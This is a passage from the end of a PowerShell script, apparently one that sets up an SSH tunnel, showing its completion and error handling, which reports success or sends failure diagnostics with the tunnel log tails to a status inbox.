    $null = Send-Inbox 'done' $done
    exit 0
} catch {
    L ("FAILED at step ${step}: " + $_.Exception.Message)
    $diag = "result=failed step=$step`nerror=$($_.Exception.Message)`n--- tunnel.log`n" + (Get-Tail (Join-Path $work 'tunnel.log') 15) + "`n--- tunnel-ssh.log`n" + (Get-Tail (Join-Path $work 'tunnel-ssh.log') 25)
    if ($script:routes.Count) { $null = Send-Inbox 'failed' $diag }
    exit 1
}
